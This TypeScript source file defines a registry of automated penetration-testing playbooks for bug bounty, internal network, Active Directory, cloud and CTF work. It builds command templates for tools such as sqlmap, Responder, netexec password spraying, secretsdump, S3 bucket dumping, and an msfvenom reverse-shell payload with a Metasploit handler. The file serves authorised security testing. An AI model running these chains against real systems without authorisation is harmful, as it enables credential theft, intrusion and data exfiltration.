/*---------------------------------------------------------------------------------------------
 *  Copyright (c) HCode. All rights reserved.
 *  Licensed under the MIT License.
 *--------------------------------------------------------------------------------------------*/

/**
 * HCode Skills — OpenClaw-style reusable methodology playbooks.
 *
 * Each Skill encodes a complete attack-chain methodology drawn from:
 *   • Nahamsec's Bug Bounty Methodology (nahamsec.com / recon_playlist)
 *   • Jason Haddix's "The Bug Hunter's Methodology" (jhaddix.com / TBHM)
 *   • TCM Security PNPT / PEH Course (tcm-sec.com)
 *   • TJ Null's OSCP Prep Guide (vulnhub / HTB)
 *   • OWASP Testing Guide v4.2 (owasp.org/www-project-web-security-testing-guide)
 *   • HackTricks (book.hacktricks.xyz)
 *   • Bug Bounty Bootcamp — V. Li (No Starch Press 2021)
 */

export type SkillCategory =
	| 'recon'
	| 'web'
	| 'network'
	| 'privesc'
	| 'cloud'
	| 'ctf'
	| 'bugbounty'
	| 'osint';

export interface SkillParam {
	/** Parameter key used in argsTemplate substitution: {key} */
	key: string;
	label: string;
	description: string;
	/** Default value if user skips input */
	defaultValue?: string;
	required: boolean;
}

export interface SkillStep {
	/** Tool id from TOOLS registry — or 'shell' for raw commands */
	toolId: string;
	/** Args / command with {param} placeholders */
	argsTemplate: string;
	description: string;
	/** If true, pipe stdout of previous step as stdin to this step */
	pipeFromPrev?: boolean;
	/** Run on the selected SSH device instead of locally */
	onDevice?: boolean;
	/** Skip if tool is not installed (graceful degradation) */
	optional?: boolean;
}

export interface Skill {
	id: string;
	name: string;
	category: SkillCategory;
	description: string;
	/** Methodology/source attribution */
	methodology: string;
	params: SkillParam[];
	steps: SkillStep[];
}

// ─────────────────────────────────────────────────────────────────────────────
// SKILLS REGISTRY
// ─────────────────────────────────────────────────────────────────────────────

export const SKILLS: Skill[] = [
	{
		id: 'ace_continuous_web_validation',
		name: 'ACE: Continuous Web Validation Loop',
		category: 'bugbounty',
		description: 'Scoped continuous validation loop for an external web target using short, verifiable recon and confirmation passes.',
		methodology: 'ACE Control Plane beta inspired by XBOW-style short-lived workers plus deterministic validation',
		params: [
			{ key: 'target', label: 'Target URL', description: 'Base URL to validate continuously', required: true },
			{ key: 'output', label: 'Output Directory', description: 'Path to save findings and evidence', defaultValue: './ace-web-validation', required: false },
		],
		steps: [
			{ toolId: 'httpx', argsTemplate: '-u {target} -title -tech-detect -status-code -o {output}/surface.txt', description: 'Confirm the live attack surface before dispatching deeper checks' },
			{ toolId: 'katana', argsTemplate: '-u {target} -d 2 -js-crawl -o {output}/crawl.txt', description: 'Collect reachable endpoints for bounded follow-up', optional: true },
			{ toolId: 'arjun', argsTemplate: '-u {target} -oJ {output}/params.json', description: 'Enumerate hidden parameters for the validator set', optional: true },
			{ toolId: 'nuclei', argsTemplate: '-u {target} -severity critical,high,medium -o {output}/nuclei.txt', description: 'Run deterministic template validation on the target' },
			{ toolId: 'dalfox', argsTemplate: 'url {target} -o {output}/dalfox.txt', description: 'Run a focused XSS validation pass on the primary target', optional: true },
		],
	},
	{
		id: 'ace_external_exposure_sweep',
		name: 'ACE: External Exposure Sweep',
		category: 'recon',
		description: 'Fast exposure sweep for a target domain that decomposes discovery into small, independently reviewable evidence files.',
		methodology: 'ACE multi-worker recon with human review checkpoints',
		params: [
			{ key: 'domain', label: 'Target Domain', description: 'Root domain to enumerate', required: true },
			{ key: 'output', label: 'Output Directory', description: 'Save path for evidence', defaultValue: './ace-exposure-sweep', required: false },
		],
		steps: [
			{ toolId: 'subfinder', argsTemplate: '-d {domain} -all -silent -o {output}/subs.txt', description: 'Enumerate candidate subdomains' },
			{ toolId: 'dnsx', argsTemplate: '-l {output}/subs.txt -resp -o {output}/resolved.txt', description: 'Resolve and reduce candidates to active DNS records' },
			{ toolId: 'httpx', argsTemplate: '-l {output}/resolved.txt -title -tech-detect -status-code -o {output}/live.txt', description: 'Probe live web services and fingerprint them' },
			{ toolId: 'naabu', argsTemplate: '-l {output}/resolved.txt -top-ports 100 -o {output}/ports.txt', description: 'Check for exposed service ports', optional: true },
			{ toolId: 'nuclei', argsTemplate: '-l {output}/live.txt -severity critical,high -o {output}/validated.txt', description: 'Run a high-signal validation pass against live services' },
		],
	},

	// ── Bug Bounty ────────────────────────────────────────────────────────────

	{
		id: 'bb_new_program_recon',
		name: 'Bug Bounty: New Program Full Recon',
		category: 'bugbounty',
		description: 'Complete recon pipeline for a new bug bounty target — subdomains → live hosts → crawl → nuclei scan → secret leak check',
		methodology: 'Nahamsec Bug Bounty Methodology + Jason Haddix TBHM v4',
		params: [
			{ key: 'domain', label: 'Target Domain', description: 'Root domain (e.g. example.com)', required: true },
			{ key: 'output', label: 'Output Directory', description: 'Path to save results', defaultValue: './bb-output', required: false },
		],
		steps: [
			{ toolId: 'subfinder', argsTemplate: '-d {domain} -all -silent -o {output}/subs.txt', description: 'Passive subdomain enumeration (subfinder)' },
			{ toolId: 'amass', argsTemplate: 'enum -passive -d {domain} -o {output}/amass-subs.txt', description: 'Deep subdomain enum (amass)', optional: true },
			{ toolId: 'dnsx', argsTemplate: '-l {output}/subs.txt -resp -o {output}/resolved.txt', description: 'Resolve subdomains via DNS' },
			{ toolId: 'httpx', argsTemplate: '-l {output}/resolved.txt -title -tech-detect -status-code -o {output}/live-hosts.txt', description: 'Probe live HTTP hosts' },
			{ toolId: 'katana', argsTemplate: '-l {output}/live-hosts.txt -d 3 -js-crawl -o {output}/crawled.txt', description: 'Crawl live hosts for endpoints', optional: true },
			{ toolId: 'gau', argsTemplate: '{domain} --o {output}/gau-urls.txt', description: 'Fetch historical URLs (gau)', optional: true },
			{ toolId: 'nuclei', argsTemplate: '-l {output}/live-hosts.txt -severity critical,high,medium -o {output}/nuclei.txt', description: 'Vulnerability scan with nuclei templates' },
			{ toolId: 'gitleaks', argsTemplate: 'detect --source . -v --report-path {output}/secrets.json', description: 'Scan workspace for leaked secrets', optional: true },
		],
	},

	{
		id: 'bb_xss_hunt',
		name: 'Bug Bounty: XSS Hunting Pipeline',
		category: 'bugbounty',
		description: 'Collect all URLs → filter params → dalfox XSS scan (Jason Haddix methodology)',
		methodology: 'Jason Haddix TBHM — XSS Hunt section',
		params: [
			{ key: 'domain', label: 'Target Domain', description: 'e.g. example.com', required: true },
			{ key: 'output', label: 'Output Directory', defaultValue: './xss-output', required: false, description: 'Where to save results' },
		],
		steps: [
			{ toolId: 'gau', argsTemplate: '{domain} --o {output}/all-urls.txt', description: 'Collect all known URLs' },
			{ toolId: 'waybackurls', argsTemplate: '{domain}', description: 'Add Wayback Machine URLs', optional: true },
			{ toolId: 'dalfox', argsTemplate: 'file {output}/all-urls.txt -o {output}/dalfox.txt', description: 'XSS scan all parameterised URLs' },
		],
	},

	{
		id: 'bb_sqli_hunt',
		name: 'Bug Bounty: SQL Injection Hunt',
		category: 'bugbounty',
		description: 'Discover endpoints → arjun parameter discovery → sqlmap',
		methodology: 'OWASP Testing Guide OTG-INPVAL-005',
		params: [
			{ key: 'target', label: 'Target URL', description: 'e.g. https://example.com/search', required: true },
			{ key: 'output', label: 'Output Directory', defaultValue: './sqli-output', required: false, description: 'Where to save results' },
		],
		steps: [
			{ toolId: 'arjun', argsTemplate: '-u {target} -oJ {output}/params.json', description: 'Discover hidden GET/POST parameters' },
			{ toolId: 'sqlmap', argsTemplate: '-u {target} --forms --batch --level=3 --risk=2 -o --output-dir={output}/sqlmap', description: 'Automated SQLi detection and exploitation' },
		],
	},

	// ── Recon ─────────────────────────────────────────────────────────────────

	{
		id: 'recon_subdomain_takeover',
		name: 'Recon: Subdomain Takeover Check',
		category: 'recon',
		description: 'Enumerate subdomains → probe with httpx → nuclei takeover templates',
		methodology: 'Nahamsec / EdOverflow takeover methodology',
		params: [
			{ key: 'domain', label: 'Target Domain', required: true, description: 'Root domain' },
			{ key: 'output', label: 'Output Directory', defaultValue: './takeover-output', required: false, description: 'Save path' },
		],
		steps: [
			{ toolId: 'subfinder', argsTemplate: '-d {domain} -silent -o {output}/subs.txt', description: 'Enumerate subdomains' },
			{ toolId: 'httpx', argsTemplate: '-l {output}/subs.txt -status-code -o {output}/live.txt', description: 'Probe HTTP hosts' },
			{ toolId: 'nuclei', argsTemplate: '-l {output}/live.txt -tags takeover -o {output}/takeovers.txt', description: 'Check for subdomain takeover vulnerabilities' },
		],
	},

	{
		id: 'recon_attack_surface',
		name: 'Recon: Full Attack Surface Mapping',
		category: 'recon',
		description: 'Map an entire organisation\'s internet-facing attack surface',
		methodology: 'Jason Haddix "Map the Attack Surface" — TBHM',
		params: [
			{ key: 'domain', label: 'Target Domain', required: true, description: 'Root domain' },
			{ key: 'output', label: 'Output Directory', defaultValue: './asm-output', required: false, description: 'Save path' },
		],
		steps: [
			{ toolId: 'amass', argsTemplate: 'enum -active -d {domain} -o {output}/amass.txt', description: 'Active subdomain enum with amass' },
			{ toolId: 'subfinder', argsTemplate: '-d {domain} -all -silent -o {output}/subfinder.txt', description: 'Passive subdomain enum' },
			{ toolId: 'theHarvester', argsTemplate: '-d {domain} -b all -f {output}/harvester', description: 'OSINT emails + IPs', optional: true },
			{ toolId: 'naabu', argsTemplate: '-l {output}/amass.txt -top-ports 1000 -o {output}/open-ports.txt', description: 'Fast port discovery' },
			{ toolId: 'httpx', argsTemplate: '-l {output}/amass.txt -ports 80,443,8080,8443 -title -tech-detect -o {output}/web-services.txt', description: 'Probe web services' },
			{ toolId: 'nuclei', argsTemplate: '-l {output}/web-services.txt -severity critical,high -o {output}/vulns.txt', description: 'Scan for high-severity vulns' },
		],
	},

	{
		id: 'recon_osint_target',
		name: 'Recon: OSINT Target Intelligence',
		category: 'osint',
		description: 'Gather OSINT on an org — WHOIS, DNS, emails, leaked creds check',
		methodology: 'SpiderFoot + theHarvester OSINT methodology',
		params: [
			{ key: 'domain', label: 'Target Domain/IP', required: true, description: 'Target to investigate' },
			{ key: 'output', label: 'Output Directory', defaultValue: './osint-output', required: false, description: 'Save path' },
		],
		steps: [
			{ toolId: 'whois', argsTemplate: '{domain}', description: 'WHOIS registration data' },
			{ toolId: 'dig', argsTemplate: '{domain} ANY', description: 'Full DNS record dump' },
			{ toolId: 'theHarvester', argsTemplate: '-d {domain} -b google,bing,linkedin,twitter -f {output}/harvester', description: 'Email/employee OSINT', optional: true },
			{ toolId: 'spiderfoot', argsTemplate: '-s {domain} -q', description: 'Automated OSINT scan', optional: true },
			{ toolId: 'trufflehog', argsTemplate: 'github --org={domain}', description: 'Scan GitHub org for leaked secrets', optional: true },
		],
	},

	// ── Web ───────────────────────────────────────────────────────────────────

	{
		id: 'web_full_audit',
		name: 'Web: Full Application Security Audit',
		category: 'web',
		description: 'Comprehensive web app audit — fingerprint → directory bruteforce → nikto → nuclei → SQLi → command injection',
		methodology: 'OWASP Testing Guide v4.2 — Full Test',
		params: [
			{ key: 'target', label: 'Target URL', required: true, description: 'e.g. https://app.example.com' },
			{ key: 'output', label: 'Output Directory', defaultValue: './web-audit', required: false, description: 'Save path' },
		],
		steps: [
			{ toolId: 'whatweb', argsTemplate: '-a 3 {target}', description: 'Fingerprint technologies and frameworks' },
			{ toolId: 'nikto', argsTemplate: '-h {target} -o {output}/nikto.txt', description: 'Common vulnerability and misconfiguration scan' },
			{ toolId: 'feroxbuster', argsTemplate: '-u {target} -w /usr/share/seclists/Discovery/Web-Content/common.txt -o {output}/dirs.txt', description: 'Recursive directory bruteforce' },
			{ toolId: 'arjun', argsTemplate: '-u {target} -oJ {output}/params.json', description: 'Hidden parameter discovery' },
			{ toolId: 'nuclei', argsTemplate: '-u {target} -tags cve,oast,xss,sqli -o {output}/nuclei.txt', description: 'Template-based vulnerability scan' },
			{ toolId: 'sqlmap', argsTemplate: '-u {target} --forms --crawl=2 --batch -o --output-dir={output}/sqlmap', description: 'SQL injection audit', optional: true },
			{ toolId: 'commix', argsTemplate: '-u {target} --all-techniques --batch', description: 'Command injection detection', optional: true },
		],
	},

	{
		id: 'web_cors_check',
		name: 'Web: CORS Misconfiguration Check',
		category: 'web',
		description: 'Check for CORS misconfigurations across all discovered endpoints',
		methodology: 'PortSwigger CORS Research / chenjj CORScanner',
		params: [
			{ key: 'target', label: 'Target URL', required: true, description: 'Base URL' },
		],
		steps: [
			{ toolId: 'corscanner', argsTemplate: '-u {target} -v', description: 'Scan for CORS misconfigs' },
			{ toolId: 'nuclei', argsTemplate: '-u {target} -tags cors', description: 'Nuclei CORS templates', optional: true },
		],
	},

	// ── Network ───────────────────────────────────────────────────────────────

	{
		id: 'network_internal_enum',
		name: 'Network: Internal Pentest Enumeration',
		category: 'network',
		description: 'Full internal network enumeration — scan → SMB/NetBIOS → password spray → secrets dump (TCM PNPT methodology)',
		methodology: 'TCM Security PNPT / Practical Ethical Hacking Course',
		params: [
			{ key: 'target', label: 'Target IP/CIDR', required: true, description: 'e.g. 192.168.1.0/24' },
			{ key: 'output', label: 'Output Directory', defaultValue: './network-enum', required: false, description: 'Save path' },
		],
		steps: [
			{ toolId: 'nmap', argsTemplate: '-sV -sC -T4 {target} -oA {output}/nmap-initial', description: 'Initial service discovery' },
			{ toolId: 'masscan', argsTemplate: '{target} -p0-65535 --rate=1000 -oG {output}/masscan.txt', description: 'Full port scan at speed', optional: true },
			{ toolId: 'enum4linux', argsTemplate: '-a {target}', description: 'SMB/NetBIOS enumeration' },
			{ toolId: 'smbmap', argsTemplate: '-H {target}', description: 'Map accessible SMB shares' },
			{ toolId: 'responder', argsTemplate: '-I eth0 -rdwv', description: 'LLMNR/NBT-NS poisoning for credential capture', onDevice: true },
			{ toolId: 'netexec', argsTemplate: 'smb {target} -u users.txt -p passwords.txt --continue-on-success', description: 'Password spray SMB', optional: true },
		],
	},

	{
		id: 'network_ad_attack',
		name: 'Network: Active Directory Attack Chain',
		category: 'network',
		description: 'AD enumeration → AS-REP roasting → Kerberoasting → Pass-the-Hash → DCSync',
		methodology: 'TCM Security PNPT — Active Directory section / HackTricks AD',
		params: [
			{ key: 'dc', label: 'Domain Controller IP', required: true, description: 'IP of the DC' },
			{ key: 'domain', label: 'AD Domain', required: true, description: 'e.g. corp.local' },
			{ key: 'output', label: 'Output Directory', defaultValue: './ad-attack', required: false, description: 'Save path' },
		],
		steps: [
			{ toolId: 'nmap', argsTemplate: '-sV -p 88,135,389,445,3389 {dc}', description: 'Scan DC service ports' },
			{ toolId: 'enum4linux', argsTemplate: '-a {dc}', description: 'SMB/RPC enumeration against DC' },
			{ toolId: 'netexec', argsTemplate: 'smb {dc} -u guest -p \"\" --shares', description: 'Check guest SMB access' },
			{ toolId: 'netexec', argsTemplate: 'smb {dc} -u users.txt -p passwords.txt --continue-on-success', description: 'Password spraying', optional: true },
			{ toolId: 'evil-winrm', argsTemplate: '-i {dc} -u admin -p {password}', description: 'WinRM shell once credentials found', optional: true },
			{ toolId: 'secretsdump', argsTemplate: '{domain}/admin:password@{dc}', description: 'Dump DC credentials via secretsdump', optional: true },
		],
	},

	// ── Privilege Escalation ──────────────────────────────────────────────────

	{
		id: 'privesc_linux',
		name: 'PrivEsc: Linux Privilege Escalation',
		category: 'privesc',
		description: 'Full Linux privilege escalation enumeration — process spying, SUID, cron, kernel exploits',
		methodology: 'TJ Null OSCP Methodology + g0tmi1k Linux PrivEsc Guide',
		params: [
			{ key: 'target', label: 'Target Device (SSH)', required: false, description: 'Run on SSH device', defaultValue: 'local' },
		],
		steps: [
			{ toolId: 'pspy', argsTemplate: '-pf -i 1000', description: 'Spy on processes and cron jobs', onDevice: true, optional: true },
			{ toolId: 'linpeas', argsTemplate: '', description: 'Run linPEAS full privilege escalation check', onDevice: true },
		],
	},

	{
		id: 'privesc_windows',
		name: 'PrivEsc: Windows Privilege Escalation',
		category: 'privesc',
		description: 'Windows privilege escalation enumeration via WinPEAS + WinRM session',
		methodology: 'TCM Security PNPT Windows PrivEsc + HackTricks Windows',
		params: [
			{ key: 'target', label: 'Target IP', required: true, description: 'Windows machine IP' },
			{ key: 'user', label: 'Username', required: true, description: 'Username for WinRM' },
			{ key: 'pass', label: 'Password', required: true, description: 'Password' },
		],
		steps: [
			{ toolId: 'evil-winrm', argsTemplate: '-i {target} -u {user} -p {pass}', description: 'Open WinRM shell' },
			{ toolId: 'netexec', argsTemplate: 'smb {target} -u {user} -p {pass} --enum-host-info', description: 'Enumerate host info via SMB', optional: true },
		],
	},

	// ── Exploitation ─────────────────────────────────────────────────────────

	{
		id: 'exploit_metasploit_handler',
		name: 'Exploit: Set Up Metasploit Listener',
		category: 'network',
		description: 'Generate a payload with msfvenom and catch it with a Metasploit handler',
		methodology: 'Metasploit Unleashed — Offensive Security',
		params: [
			{ key: 'lhost', label: 'LHOST (Your IP)', required: true, description: 'Your listener IP' },
			{ key: 'lport', label: 'LPORT', required: false, description: 'Listener port', defaultValue: '4444' },
		],
		steps: [
			{ toolId: 'msfvenom', argsTemplate: '-p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o shell.exe', description: 'Generate Windows reverse TCP payload' },
			{ toolId: 'msfconsole', argsTemplate: '-q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run"', description: 'Launch Metasploit multi/handler to catch shell' },
		],
	},

	// ── Cloud ─────────────────────────────────────────────────────────────────

	{
		id: 'cloud_aws_enum',
		name: 'Cloud: AWS Enumeration',
		category: 'cloud',
		description: 'Enumerate AWS environment — identity, S3, IAM, EC2 (with misconfigured roles check)',
		methodology: 'Rhino Security Labs AWS Pentest Methodology / CloudGoat',
		params: [
			{ key: 'region', label: 'AWS Region', required: false, description: 'Default: us-east-1', defaultValue: 'us-east-1' },
			{ key: 'org', label: 'GitHub Org (for secrets)', required: false, description: 'GitHub org to check for leaked keys', defaultValue: '' },
		],
		steps: [
			{ toolId: 'awscli', argsTemplate: 'sts get-caller-identity', description: 'Verify current IAM identity' },
			{ toolId: 'awscli', argsTemplate: 's3 ls', description: 'List accessible S3 buckets' },
			{ toolId: 'awscli', argsTemplate: 'iam list-users', description: 'Enumerate IAM users' },
			{ toolId: 'awscli', argsTemplate: 'ec2 describe-instances --region {region}', description: 'List EC2 instances' },
			{ toolId: 'trufflehog', argsTemplate: 'github --org={org}', description: 'Scan GitHub org for leaked AWS keys', optional: true },
		],
	},

	{
		id: 'cloud_s3_enum',
		name: 'Cloud: S3 Bucket Enumeration',
		category: 'cloud',
		description: 'Find and dump open S3 buckets for a target organization',
		methodology: 'HackTricks Cloud — S3 Bucket Enumeration',
		params: [
			{ key: 'orgname', label: 'Org / Keyword', required: true, description: 'e.g. acme (used to guess bucket names)' },
			{ key: 'output', label: 'Output Directory', defaultValue: './s3-output', required: false, description: 'Save path' },
		],
		steps: [
			{ toolId: 's3scanner', argsTemplate: 'scan --bucket {orgname}', description: 'Check if bucket exists and is public' },
			{ toolId: 's3scanner', argsTemplate: 'dump --bucket {orgname} -d {output}', description: 'Dump public bucket contents', optional: true },
		],
	},

	// ── CTF ───────────────────────────────────────────────────────────────────

	{
		id: 'ctf_binary_analysis',
		name: 'CTF: Binary Analysis',
		category: 'ctf',
		description: 'CTF binary challenge workflow — strings → binwalk → radare2 reverse engineering',
		methodology: 'LiveOverflow / pwn.college / CTF101 framework',
		params: [
			{ key: 'binary', label: 'Binary File Path', required: true, description: 'Path to the binary or firmware file' },
		],
		steps: [
			{ toolId: 'strings', argsTemplate: '-n 8 {binary}', description: 'Extract printable strings (min length 8)' },
			{ toolId: 'binwalk', argsTemplate: '-e {binary}', description: 'Extract embedded files and firmware' },
			{ toolId: 'radare2', argsTemplate: '-A -c "afl; afl~main" {binary}', description: 'Analyze all functions with radare2', optional: true },
		],
	},

	{
		id: 'ctf_web_challenge',
		name: 'CTF: Web Challenge Quick Scan',
		category: 'ctf',
		description: 'Quick scan pipeline for CTF web challenges — fingerprint → dirs → source leaks',
		methodology: 'CTF Web Hacking — IppSec / PicoCTF methodology',
		params: [
			{ key: 'target', label: 'Challenge URL', required: true, description: 'e.g. http://challenge.ctf:8080' },
			{ key: 'output', label: 'Output Directory', defaultValue: './ctf-web', required: false, description: 'Save path' },
		],
		steps: [
			{ toolId: 'whatweb', argsTemplate: '-a 3 {target}', description: 'Identify technologies' },
			{ toolId: 'nikto', argsTemplate: '-h {target}', description: 'Quick vuln scan' },
			{ toolId: 'gobuster', argsTemplate: 'dir -u {target} -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt,js -o {output}/dirs.txt', description: 'Directory brute-force' },
			{ toolId: 'gitleaks', argsTemplate: 'detect --source . -v', description: 'Check for exposed secrets', optional: true },
		],
	},

	{
		id: 'ctf_network_challenge',
		name: 'CTF: Network/Box Initial Recon',
		category: 'ctf',
		description: 'Standard CTF box enumeration (HTB/THM/OSCP) — nmap → service enum → gobuster',
		methodology: 'IppSec HTB methodology / TJ Null OSCP Prep',
		params: [
			{ key: 'target', label: 'Target IP', required: true, description: 'Box IP address' },
			{ key: 'output', label: 'Output Directory', defaultValue: './box-recon', required: false, description: 'Save path' },
		],
		steps: [
			{ toolId: 'rustscan', argsTemplate: '-a {target} --ulimit 5000 -- -sV -sC -oA {output}/nmap', description: 'Fast all-port scan → nmap service detection' },
			{ toolId: 'gobuster', argsTemplate: 'dir -u http://{target} -w /usr/share/seclists/Discovery/Web-Content/common.txt -o {output}/dirs.txt', description: 'Web directory enum (if web found)', optional: true },
			{ toolId: 'enum4linux', argsTemplate: '-a {target}', description: 'SMB enumeration (if port 445 open)', optional: true },
			{ toolId: 'nuclei', argsTemplate: '-u http://{target} -severity critical,high -o {output}/nuclei.txt', description: 'Template-based vuln scan', optional: true },
		],
	},

];
